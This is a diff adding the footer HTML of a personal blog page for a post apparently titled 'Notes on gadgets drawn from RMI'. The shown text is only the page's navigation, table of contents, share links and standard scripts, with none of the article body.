+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%9D%A1"><span class="toc-number">2.</span> <span class="toc-text">第一条</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%9D%A1"><span class="toc-number">3.</span> <span class="toc-text">第二条</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/11/23/%E8%AE%B0%E5%BD%95-RMI-%E5%BC%95%E5%87%BA%E7%9A%84-Gadgets/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/11/23/%E8%AE%B0%E5%BD%95-RMI-%E5%BC%95%E5%87%BA%E7%9A%84-Gadgets/&text=记录 RMI 引出的 Gadgets"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/11/23/%E8%AE%B0%E5%BD%95-RMI-%E5%BC%95%E5%87%BA%E7%9A%84-Gadgets/&title=记录 RMI 引出的 Gadgets"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/11/23/%E8%AE%B0%E5%BD%95-RMI-%E5%BC%95%E5%87%BA%E7%9A%84-Gadgets/&is_video=false&description=记录 RMI 引出的 Gadgets"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=记录 RMI 引出的 Gadgets&body=Check out this article: http://example.com/2025/11/23/%E8%AE%B0%E5%BD%95-RMI-%E5%BC%95%E5%87%BA%E7%9A%84-Gadgets/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/11/23/%E8%AE%B0%E5%BD%95-RMI-%E5%BC%95%E5%87%BA%E7%9A%84-Gadgets/&title=记录 RMI 引出的 Gadgets"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/11/23/%E8%AE%B0%E5%BD%95-RMI-%E5%BC%95%E5%87%BA%E7%9A%84-Gadgets/&title=记录 RMI 引出的 Gadgets"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/11/23/%E8%AE%B0%E5%BD%95-RMI-%E5%BC%95%E5%87%BA%E7%9A%84-Gadgets/&title=记录 RMI 引出的 Gadgets"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/11/23/%E8%AE%B0%E5%BD%95-RMI-%E5%BC%95%E5%87%BA%E7%9A%84-Gadgets/&title=记录 RMI 引出的 Gadgets"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/11/23/%E8%AE%B0%E5%BD%95-RMI-%E5%BC%95%E5%87%BA%E7%9A%84-Gadgets/&name=记录 RMI 引出的 Gadgets&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/11/23/%E8%AE%B0%E5%BD%95-RMI-%E5%BC%95%E5%87%BA%E7%9A%84-Gadgets/&t=记录 RMI 引出的 Gadgets"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Oyst3r
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
